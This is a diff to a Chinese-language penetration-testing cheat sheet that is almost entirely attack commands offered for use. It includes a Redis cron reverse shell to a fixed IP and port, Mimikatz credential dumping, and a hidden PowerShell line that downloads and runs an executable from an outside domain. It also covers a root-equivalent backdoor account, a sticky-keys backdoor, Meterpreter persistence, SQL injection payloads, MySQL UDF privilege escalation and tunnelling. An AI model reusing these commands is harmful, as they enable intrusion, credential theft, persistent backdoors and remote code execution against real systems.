@@ -31,7 +31,7 @@ net use c: /del
 net use * /del
 
 
-dsquery server         #查看域控服务器
+dsquery server        #查看域控服务器
 dsquery subnet        #查看域IP范围
 
 2 第二种方式是把 powershell 文件上传到堡垒机本地执行， powershell.exe ". .\Invoke-Mimikatz.ps1; Invoke-Mimikatz –DumpCreds"
@@ -50,11 +50,20 @@ https://github.com/jaredhaight/psattackbuildtool,powersploit,powercat
 mimikatz.exe privilege::debug sekurlsa::logonPasswords exit >> result.txt
 
 redis cron reverse shell:
-	redis-cli -h $1 flushall
 	echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
 	redis-cli -h $1 config set dir /var/spool/cron/
 	redis-cli -h $1 config set dbfilename root
 	redis-cli -h $1 save
+
+SSRF：
+除了可以直接写定时任务拿到SHELL，还可以有多种姿势。
+写cron反弹一个shell
+写~/.ssh/authorized_keys，使用密钥直接登录
+找到web目录的绝对路径，直接写web shell
+写初始化脚本
+/etc/profile.d/
+主从模式利用
+	
 	
 Linux 添加用户:
 useradd -o -u 0 -g 0 -M -d /root -s /bin/bash php
@@ -64,13 +73,12 @@ ssh转发,利用生成的ssh公钥登录
 
 ssh -C -f -N -g -L 80:174.139.9.66:8080     master@174.139.9.66
 
-2.将发往174.139.9.66的8080访问转发到174.139.1.67的80端口
-
+2.将发往174.139.1.67的80端口访问转发到174.139.9.66的8080
+------------------------》》》》》》》》》》》》》》》》》》
 ssh -C -f -N -g -R 80:174.139.9.66:8080            master@174.139.1.67在本机运行
 %windir%\SysWoW64\cmd.exe /c cscript exp.vbs /e db.mdb export.txt
 
 docker,git,wooyun,shell,powershell
-icacls,sc
 http://www.njstu.net/69394.html
 https://www.draw.io/
 ssh -T user@localhost /bin/bash -i
@@ -78,7 +86,7 @@ ssh -T user@localhost /bin/bash -i
 205.171.3.65
 205.171.2.65
 
-php双引号${${phpinfo();}}
+php双引号${${phpinfo();}} php://filter/read=convert.base64-encode/resource=../key.php
 python -m SimpleHTTPServer 233
 
 
@@ -116,6 +124,10 @@ post/windows/gather/enum_patches 查找提权模块
 
 meterpreter 中加入开机自启动5s自动回连
 run persistence -X -i 5 -p 41234 -r ip
+run get_local_subnets
+run enum_putty
+run post/windows/gather/enum_ie
+正向连接：就是将bind_tcp生成的程序放在受害者机器上运行，会在本地监听端口，然后msf设置相应payload，去访问这个端口。-----》》
 
 
 shift后门:
@@ -123,3 +135,85 @@ copy c:\windows\system32\sethc.exe c:\windows\system32\sethc1.exe
 copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
 
 tasklist /s ip /u username /p password  验证密码
+icacls "c:\users\" 查看文件夹拥有者
+net start "some"
+sc stop "some service"
+
+netdiscover kail下的arp扫描工具
+
+ssocks(https://sourceforge.net/projects/ssocks/):
+先在vps 执行rcsocket.exe –l 1088 –p 8888 –vv, 监听1088端口
+内网机器执行./rssocks –vv –s 192.168.30.103:8888(VPS
+
+
+
+hh -decompile test poc.chm
+
+burpsuuite intruder:
+Sniper:
+只有一个payload,会将payload分别放在每个Fuzz点测试,默认选项
+Battering Ram:
+只有一个payload,会将payload同时放在多个Fuzz点测试.
+Pitchfork:
+多个payload,会将多个payload同一行同时放到相应Fuzz点测试.(适用扫号)
+Cluster Bomb:
+多个payload,payload在其Fuzz点循环测试,直到尝试所有可能.(适用多账户枚举密码)
+
+. .\in.ps1 
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden —File "C:\do_neat_ps_shit.ps1"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden 
+powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden -nop -c (new-object System.Net.WebClient).DownloadFile("http://www.nan3r.tk/tool/Server.exe","$env:temp\fpm.exe");powershell -nop -c "$env:temp\fpm.exe"
+
+schtasks /create /sc minute /mo 20 /tn "runcalc" /tr "c:\users\administrator\Appdata\local\temp\calc.exe"  计划任务每 20 分钟运行一次
+
+
+
+gopher 可以get与post，，，phar协议读取压缩文件
+
+报错注入语句(时间[benchmark,sleep],布尔，报错)：
+hah"&&(1=(updatexml(1,concat(0x5c,(select (group_concat(schema_name)) from information_schema.schemata),0x5c),1)))#
+select(group_concat(table_name))from(information_schema.tables)where(table_schema=0x)
+select(group_concat(column_name))from(information_schema.columns)where(table_schema=0x)&&(table_name=0x)
+
+select substr('password' from 1 for 4);  from起始位置,for长度
+
+
+string.letters+string.digits
+1 >>> import string
+2 >>> leet = string.maketrans('abegiloprstz','463611092572')
+3 >>> s = 'The quick brown fox jumped over the lazy dog'
+4 >>> print s
+5 The quick brown fox jumped over the lazy dog
+6 >>> print s.translate(leet)
+7 Th3 qu1ck 620wn f0x jum93d 0v32 7h3 142y d06
+
+设置history时间：
+export HISTTIMEFORMAT='%F %T '
+ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
+$IFS可以替代Linux命令执行时的空格
+查找日志：
+ps -ef|grep httpd
+ls -la /proc/pid/fd
+
+如果本来在该位上有x, 则这些特殊标志显示为小写字母 (s, s, t). 若无执行权限则显示为大写字母 (S, S, T)
+a – setuid位, 如果该位为1, 则表示设置setuid 4xxx
+b – setgid位, 如果该位为1, 则表示设置setgid 2xxx
+c – sticky位, 如果该位为1, 则表示设置sticky 1xxx
+
+sudo find / -type f -perm -6000
+-号表示有1的位置一定要正确匹配,其他无所谓。这里要转成二进制来说,首先6000转成三位的二进制是下面这个样子
+110 000 000 000
+也就是要求前两个11必须匹配,后面的无所谓。
++号的意思是,只要有一个1匹配就行了,也就是说前2位中,只要有一个1就行
+
+sc create tscon binpath= "cmd.exe /k tscon sessionid /dest:sessionname"   必须要有空格，只能有console到rdp,net start tescon
+
+
+udf提权：
+https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+select @@basedir;   @@plugin_dir show variables like "%plugin_dir%";
+//查找到mysql的目录
+select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';   
+//利用NTFS ADS创建lib目录
+select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
+//利用NTFS ADS创建plugin目录
